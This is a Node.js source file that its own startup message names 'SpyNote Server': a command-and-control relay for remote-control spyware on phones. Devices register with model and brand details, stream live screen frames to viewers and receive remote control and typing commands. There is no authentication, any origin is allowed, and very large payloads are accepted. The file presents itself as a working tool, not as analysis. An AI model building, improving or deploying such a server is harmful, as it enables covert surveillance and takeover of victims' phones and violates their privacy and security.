const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const compression = require('compression');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: "*", methods: ["GET", "POST"] },
    pingTimeout: 15000,
    pingInterval: 5000,
    maxHttpBufferSize: 200 * 1024 * 1024
});

app.use(compression());
app.use(express.static('public'));
app.use(express.json({ limit: '200mb' }));
app.use(express.urlencoded({ limit: '200mb', extended: true }));

const devices = new Map();
const deviceSockets = new Map();

app.post('/register', (req, res) => {
    const { deviceId, model, brand, version, status } = req.body;
    if (deviceId) {
        devices.set(deviceId, { model, brand, version, status, connected: true });
        io.emit('devices-update', Array.from(devices.entries()));
        console.log("✅ Device registered:", deviceId);
    }
    res.json({ success: true });
});

app.get('/devices', (req, res) => {
    res.json(Array.from(devices.entries()));
});

io.on('connection', (socket) => {
    console.log('🔌 Client connected:', socket.id);

    socket.on('register-device', (deviceInfo) => {
        const deviceId = deviceInfo.deviceId;
        if (deviceId) {
            devices.set(deviceId, { 
                ...deviceInfo, 
                connected: true, 
                socketId: socket.id 
            });
            deviceSockets.set(deviceId, socket.id);
            socket.join(deviceId);
            io.emit('devices-update', Array.from(devices.entries()));
            console.log("📱 Device registered:", deviceId);
        }
    });

    socket.on('screen-frame', (data) => {
        const deviceId = data.deviceId;
        if (devices.has(deviceId)) {
            socket.broadcast.to(deviceId).emit('screen-update', {
                deviceId,
                data: data.data,
                width: data.width,
                height: data.height,
                timestamp: data.timestamp
            });
        }
    });

    // 🔥 PERFECT CONTROL HANDLER (Typing Added)
    socket.on('control', (data) => {
        console.log('🎮 CONTROL:', data.action, 'Device:', data.deviceId);
        
        const { deviceId, action } = data;
        if (!devices.has(deviceId)) return;

        const targetSocketId = deviceSockets.get(deviceId);
        if (!targetSocketId) return;

        // 🔥 Send to specific device socket + room
        io.to(deviceId).emit('control', data);
        io.to(targetSocketId).emit('control', data);
    });

    socket.on('disconnect', () => {
        console.log('🔌 Client disconnected:', socket.id);
        for (const [deviceId, info] of devices.entries()) {
            if (info.socketId === socket.id) {
                devices.set(deviceId, { ...info, connected: false });
                deviceSockets.delete(deviceId);
                io.emit('devices-update', Array.from(devices.entries()));
                break;
            }
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`🚀 SpyNote Server: http://localhost:${PORT}`);
    console.log(`📱 Multi-device + FULL CONTROL + TYPING ready!`);
});
